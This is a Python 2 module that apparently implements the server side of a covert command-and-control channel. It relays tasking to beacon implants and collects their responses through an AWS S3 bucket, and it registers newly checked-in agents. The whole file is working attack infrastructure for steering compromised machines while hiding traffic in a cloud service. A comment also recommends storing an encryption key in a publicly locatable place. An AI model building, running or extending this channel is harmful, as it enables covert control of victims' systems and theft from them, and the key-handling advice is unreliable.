import boto3
from botocore.exceptions import ClientError
from time import sleep
import uuid
from pprint import pprint

# CS-S3-Agent user credentials with full access to S3
# Instead of hardcoding, probably should hard-code an encryption
# key and store in a publicly locatable place, then decrypt and pass to client.
# This should be the same across server/client.
AWS_SECRET_KEY = 'YOUR_SECRET_KEY'
AWS_ACCESS_KEY = 'YOUR_ACCESS_KEY'
s3 = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY, aws_secret_access_key=AWS_SECRET_KEY)
bucketName = 'YOUR_S3BUCKET'
taskKeyName = 'TaskForYou'
respKeyName = 'RespForYou'

def prepTransport():
	return 0

def sendData(data, beaconId):
    keyName = "{}:{}:{}".format(beaconId, taskKeyName, str(uuid.uuid4()))
    s3.put_object(Body=data, Bucket=bucketName, Key=keyName)

def retrieveData(beaconId):
    keyName = "{}:{}".format(beaconId, respKeyName)
    while True:
        try:
            resp = s3.list_objects(Bucket=bucketName, Prefix=keyName)
            objects = resp['Contents']
            if objects:
                taskResponses = []
                for obj in objects:
                    resp = s3.get_object(Bucket=bucketName, Key=obj['Key'])
                    msg = resp['Body'].read()
                    s3.delete_object(Bucket=bucketName, Key=obj['Key'])
                    taskResponses.append(msg)
                return taskResponses
        except ClientError as e:
            if e.response['Error']['Code'] == 'NoSuchKey':
                sleep(5)
            else:
                raise e
        except KeyError as e:
            # No objects returned, thus wait.
            sleep(5)

def fetchNewBeacons():
    """
    Function responsible for fetching new beacons that have registered
    to the S3 bucket via key AGENT:BeaconId.

    TODO: When client registers, add some basic sys info like computer
          architecture and negotiate stager based on arch.

    Returns:
        list - List of beacon IDs that need to be handled
    """
    try:
        # http://boto3.readthedocs.io/en/latest/reference/services/s3.html#S3.Client.list_objects
        resp = s3.list_objects(Bucket=bucketName)
        objects = resp['Contents']
        beacons = []
        # beacons = [obj.split(':')[1] for obj in objects if 'AGENT:' in obj['Key']]
        for obj in objects:
            if 'AGENT:' in obj['Key']:
                beaconId = obj['Key'].split(':')[1]
                print '[ + ] Discovered new Agent in bucket: {}'.format(beaconId)
                # Remove the beacon registration
                s3.delete_object(Bucket=bucketName, Key=obj['Key'])
                # append beacon
                beacons.append(beaconId)
        if beacons:
            print '[ + ] Returning {} beacons for first-time setup.'.format(len(beacons))
        return beacons
    except KeyError, e:
        # No worries, just means bucket is empty
        return []
    except Exception, e:
        print '[-] Something went terribly wrong while polling for new agents. Reason:\n{}'.format(e)
        return []